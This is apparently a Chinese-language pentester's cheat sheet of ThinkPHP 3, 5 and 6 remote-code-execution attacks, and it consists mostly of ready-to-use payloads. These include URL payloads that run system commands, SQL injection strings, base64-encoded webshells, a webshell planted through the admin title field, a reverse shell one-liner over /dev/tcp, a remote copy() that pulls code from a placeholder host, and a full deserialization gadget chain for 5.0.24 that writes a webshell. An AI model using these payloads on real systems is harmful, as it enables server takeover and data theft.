# Thinkphp——RCE

---

总结：3和5都有

```
https://www.cnblogs.com/0xdd/p/11102426.html

https://mp.weixin.qq.com/s?src=11&timestamp=1610677492&ver=2829&signature=qSAkzeeuM1ddHSQ-jdpYZlK*ZPNtriMl6TVSNeSL12Q-9vRtMoL954DUZOice6iV6-L3GJlY3bAtQAkcOciabH*oP6M-7c4*fdFLnUNt94w6OQi0EGTTNDhf1OGG*RfG&new=1

https://www.cnblogs.com/Mikasa-Ackerman/p/ThinkPhp-zhiRce-fen-xi.html

https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection
```

---

## Thinkphp3

Tp3一般是底层出现漏洞，二次开发调用有漏洞的方法导致漏洞发生

thinkphp3.1.3 二次开发 sql回传注入缓存 

- 教程：https://www.zhihuifly.com/t/topic/309

- /ThinkPHP/Library/Think/Model.class.php中find函数（本来就有漏洞）被调用，未经过处理直接调用产生漏洞

```
比如在/Application/Home/Controller/IndexController.class.php写入了
public function test()
    {
       $id = I('id');
       $res = M('user')->find($id);
       //$res = M('user')->delete($id);
       //$res = M('user')->select($id);
    }    
    //----
    I('get.id',0,'intval')  //I是Tp过滤参数的方法。用intval过滤get请求的id参数，不符合则为0
    C('参数名','参数值')     //设置参数值
    C('参数名')             //从配置中获取参数值
    M('表名')             //实例化数据表，进行操作
```

- payload

	```
	/index.php/home/index/test?id[field]=2,3,4,'%0aphpinfo();//'&id[cache][key]=1
	```

- 结果：产生c4ca4238a0b923820dcc509a6f75849b.php

  ```
  id[cache][key]=1 中的值 的MD5 -》c4ca4238a0b923820dcc509a6f75849b
  /Application/Runtime/Temp/c4ca4238a0b923820dcc509a6f75849b.php
  ```



Thinkphp3.2.3 update注入漏洞

- save->update

  ```
  class UserController extends Controller {
   
      public function user(){
          $User = M("member");
          $user['id'] = I('id');
          $data['money'] = I('money');
          $data['user'] = I('user');
          $valu = $User->where($user)->save($data);
          var_dump($valu);
      }
  }
  
  ```

- payload（需要开启debug模式）


   ```
/index.php/home/user?id[]=bind%27&money[]=1123&user=liao&id[0]=bind&id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))
   ```

信息泄露：

```
/index.php/home/res/re
```

后台getshell

```
后台标题：',@eval($_POST['a']),'
/application/common/conf/site.php
```

漏洞扫描+日志扫描：

```
https://github.com/sukabuliet/ThinkphpRCE
https://github.com/Lotus6/ThinkphpGUI
```



----

## Thinkphp5

index模块要存在，如果不存在就看哪个模块存在进行替换（如：home、admin  {s=home、s=admin}）

入口文件index.php可能在其他目录

均通过入口文件进行寻找模块：index.php?s= 

总结：

```
https://www.cnblogs.com/Mikasa-Ackerman/p/ThinkPhp-zhiRce-fen-xi.html
```

Thinkphp 5.0.7

```
/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```

Thinkphp 5.0.x  （5.0.24及以上不能）

```
get:（开兼容模式）(有些地方必须要/index.php?s=)
/?s=index/think\config/get&name=database.username // 获取配置信息
/?s=index/\think\Lang/load&file=../../test.jpg    // 包含任意文件
/s=index/think\Lang/load&file=../../test.jpg    // 包含任意文件(与上面相比去掉\绕过了宝塔)
/?s=index/\think\Config/load&file=../../t.php     // 包含任意.php文件
/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
/?s=index|think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][0]=whoami
/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()
---
post:未开强制路由，或利用变量覆盖达到命令执行
/?s=captcha
执行php函数：_method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo
包含文件：   _method=__construct&method=get&filter[]=think\__include_file&server[]=-1&get[]=根目录
            _method=__construct&filter[]=strrev&filter[]=think\__include_file&method=get&server[]=1&get[]=根目录倒序文字（txt.1）
           _method=__construct&filter[]=strrev&filter[]=think\__include_file&method=get&server[]=1&get[]=
           txt.1=ecruoser/edocne-46esab.trevnoc=daer/retlif//:php    #包含看文件内容，base64编码预防编码错误
执行命令：   _method=__construct&filter[]=system&method=GET&get[]=whoami
-
/?s=captcha&test=phpinfo()  
 _method=__construct&filter[]=assert&method=get&server[REQUEST_METHOD]=-1

/?s=captcha&r=ZXZhbCgkX1BPU1RbJ2NtZCddKTs=   ->一句话cmd
/?s=captcha&r=cGhwaW5mbygpOw==               ->phpinfo
    _method=__construct&filter[]=base64_decode&filter[]=think\__include_file&method=get&server[]=1&get[]=cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPS90bXAvc2Vzc19oYWhhaGF0ZXN0
    
/?s=captcha&g=implode
path=PD9waHAgZmlsZV9wdXRfY29udGVudHMoJzEyMy5waHAnLCc8P3BocCBwaHBpbmZvKCk7Pz4nKTsgPz4=&_method=__construct&filter[]=set_error_handler&filter[]=self::path&filter[]=base64_decode&filter[]=\think\view\driver\Php::Display&method=GET
```


Thinkphp 5.1.x

```
/?s=index/\think\Request/input&filter[]=system&data=pwd
/?s=index/\think\view\driver\Php/display&content=<?php phpinfo();?>
/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id

post:未开强制路由，或利用变量覆盖达到命令执行
/?s=captcha
执行php函数：_method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo
包含文件：   _method=__construct&filter[]=highlight_file&method=GET&get[]=/etc/passwd
执行命令：   s=whoami&_method=__construct&method=&filter[]=exec
```

Thinkphp常见日志路径：

```
3: ['/Runtime/Logs/', '/Runtime/Logs/Admin','/Runtime/Logs/home','/App/Runtime/Logs/', '/Application/Runtime/Logs/Admin/', '/Application/Runtime/Logs/Home/', '/Application/Runtime/Logs/'],
5: '/runtime/log/',

/application/runtime/logs/home/21_02_01.log
/application/runtime/logs/admin/21_02_01.log
/runtime/log/21_02_01.log
/runtime/log/202102/09.log
3.x
/Runtime/Logs/home/21_02_01.log
```

常用payload

```
cmd:PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=
写文件php代码：assert函数
	file_put_contents(写入文件路径，文件内容)
	file_put_contents('xx.php',base64_decode('一句话的base64'))
	file_put_contents(base64_decode('文件名的base64'),base64_decode('一句话的base64'))
	copy(复制路径,粘贴路径)
	copy('http://xxx.com/ss.txt','ss.php')
	解码执行以上语句的编码
		base64_decode('xxxx')
写文件执行命令：system函数
	echo ^一句话马^ >> xx.php

反弹shell:
	服务端：nc -lvp 服务端端口号
	反弹端: bash -i > /dev/tcp/服务端IP/服务端端口号
```

问题

```
1.如果phpinfo能执行，但是下面的不能执行，可能是没有权限写入
可以直接phpinfo替换成eval()一句话用蚁剑连接
2.没有权限写入时，可以试试蚁剑修改目录权限，再传，要传到能访问的目录中
```

注入：

```
影响环境：
5.0.13<=ThinkPHP<=5.0.15 、 5.1.0<=ThinkPHP<=5.1.5
/index.php/index/index/?username[0]=inc&username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)&username[2]=1

```

---

**Thinkphp6 反序列化rce**

- 背景
  ```
  php环境7以上
  url路由：/控制器/操作/参数
  ```
- 参考
  ```
  https://www.cnblogs.com/-chenxs/p/12020777.html
  https://xz.aliyun.com/t/9405#toc-3   # 含poc
  ```
- 漏洞位置
  ```
  假设控制器中有
  unserialize($_GET['c'])
  ```
  

**Thinkphp5.0.24 反序列化rce**
- 背景
  
  ```
  只能使用于linux系统，windows系统需要另外配合,因为windows对文件名有限制，会写入失败
  ```
  
- 教程
  
  ```
  http://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/
  https://xz.aliyun.com/t/7457  # Thinkphp5.0反序列化链在Windows下写文件的方法
  ```
  
- 漏洞位置

  ```
  unserialize($_GET['c'])
  ```

- 利用
  ```
  #--1.php，本地访问1.php获取payload
  <?php
  namespace think\process\pipes;
  use think\model\Pivot;
  class Pipes{
  
  }
  
  class Windows extends Pipes{
  	private $files = [];
  
  	function __construct(){
  		$this->files = [new Pivot()];
  	}
  }
  
  namespace think\model;#Relation
  use think\db\Query;
  abstract class Relation{
  	protected $selfRelation;
  	protected $query;
  	function __construct(){
  		$this->selfRelation = false;
  		$this->query = new Query();#class Query
  	}
  }
  
  namespace think\model\relation;#OneToOne HasOne
  use think\model\Relation;
  abstract class OneToOne extends Relation{
  	function __construct(){
  		parent::__construct();
  	}
  
  }
  class HasOne extends OneToOne{
  	protected $bindAttr = [];
  	function __construct(){
  		parent::__construct();
  		$this->bindAttr = ["no","123"];
  	}
  }
  
  namespace think\console;#Output
  use think\session\driver\Memcached;
  class Output{
  	private $handle = null;
  	protected $styles = [];
  	function __construct(){
  		$this->handle = new Memcached();//目的调用其write()
  		$this->styles = ['getAttr'];
  	}
  }
  
  namespace think;#Model
  use think\model\relation\HasOne;
  use think\console\Output;
  use think\db\Query;
  abstract class Model{
  	protected $append = [];
  	protected $error;
  	public $parent;#修改处
  	protected $selfRelation;
  	protected $query;
  	protected $aaaaa;
  
  	function __construct(){
  		$this->parent = new Output();#Output对象,目的是调用__call()
  		$this->append = ['getError'];
  		$this->error = new HasOne();//Relation子类,且有getBindAttr()
  		$this->selfRelation = false;//isSelfRelation()
  		$this->query = new Query();
  
  	}
  }
  
  namespace think\db;#Query
  use think\console\Output;
  class Query{
  	protected $model;
  	function __construct(){
  		$this->model = new Output();
  	}
  }
  
  namespace think\session\driver;#Memcached
  use think\cache\driver\File;
  class Memcached{
  	protected $handler = null;
  	function __construct(){
  		$this->handler = new File();//目的调用File->set()
  	}
  }
  namespace think\cache\driver;#File
  class File{
  	protected $options = [];
  	protected $tag;
      function __construct(){
      	$this->options = [
  		'expire'        => 0,
  		'cache_subdir'  => false,
  		'prefix'        => '',
  		'path'          => 'php://filter/write=string.rot13/resource=./<?cuc cucvasb();riny($_TRG[pzq]);?>',
  		'data_compress' => false,
  		];
  		$this->tag = true;
      }
  }
  
  namespace think\model;
  use think\Model;
  class Pivot extends Model{
  
  
  }
  use think\process\pipes\Windows;
  echo base64_encode(serialize(new Windows()));
  ```

tp5和tp3路由

```
tp3
app/lib/action/Admin/AdminAction.class.php   -> m=admin&c=admin&
```

